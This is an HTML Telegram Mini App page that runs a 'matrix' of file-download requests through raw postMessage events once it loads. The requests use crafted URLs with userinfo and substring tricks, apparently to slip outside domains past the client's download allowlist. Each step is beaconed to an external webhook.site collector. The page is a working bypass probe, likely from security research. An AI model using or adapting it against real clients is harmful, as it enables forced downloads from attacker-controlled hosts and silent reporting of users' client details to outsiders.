<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>web-app-ext matrix v7</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
body { font-family: monospace; background: #fff; color: #111; padding: 6px; font-size: 11px; margin: 0; }
#out { max-height: 100vh; overflow-y: auto; }
.log { border-bottom: 1px solid #eee; padding: 2px 0; word-break: break-all; }
.ok { color: green; } .bad { color: #b00; } .dim { color: #888; }
</style>
</head>
<body>
<div id="out"></div>
<script>
const WH = 'https://webhook.site/74aa897d-5aac-4477-890c-179212c5e77b';
const DOM = 'matthewadem.github.io';
const tg = window.Telegram.WebApp;
const out = document.getElementById('out');
let seq = 0;
function log(msg, cls) {
  const d = document.createElement('div');
  d.className = 'log ' + (cls || '');
  d.textContent = (++seq) + '| ' + msg;
  out.appendChild(d);
  out.scrollTop = out.scrollHeight;
  try { navigator.sendBeacon(WH + '/log', String(seq) + ' ' + msg); } catch(e) {}
}
function rawEvent(type, data) {
  window.parent.postMessage(JSON.stringify({eventType: type, eventData: data}), '*');
}
log('probe7 init platform=' + tg.platform + ' v=' + tg.version + ' initData=' + (tg.initData ? 'yes' : 'NO'));
tg.ready();
tg.onEvent('file_download_requested', ev => log('EV file_download_requested: ' + JSON.stringify(ev), 'dim'));

const CASES = [
  { id: 'ctrl-plain',     url: WH + '/ctrl1-plain.png' },
  { id: 'ctrl-substring', url: 'https://webhook.site/matthewadem.github.io/ctrl2.png' },
  { id: 'foreign-userinfo', url: 'https://' + DOM + '@webhook.site/74aa897d-5aac-4477-890c-179212c5e77b/ctrl3-foreign.png' },
  { id: 'tg-userinfo',    url: 'https://' + DOM + '@web.telegram.org/k/' }
];

let idx = 0;
function next() {
  if (idx >= CASES.length) { log('MATRIX DONE', 'ok'); return; }
  const c = CASES[idx++];
  log('[' + c.id + '] posting url=' + c.url, 'dim');
  try {
    rawEvent('web_app_request_file_download', {url: c.url, file_name: 'p7_' + c.id + '.bin'});
    log('[' + c.id + '] posted');
  } catch (e) {
    log('[' + c.id + '] threw: ' + (e && e.message || e), 'bad');
  }
  setTimeout(next, 13000);
}
if (tg.initData) {
  log('autorun in 2s');
  setTimeout(next, 2000);
}
</script>
</body>
</html>
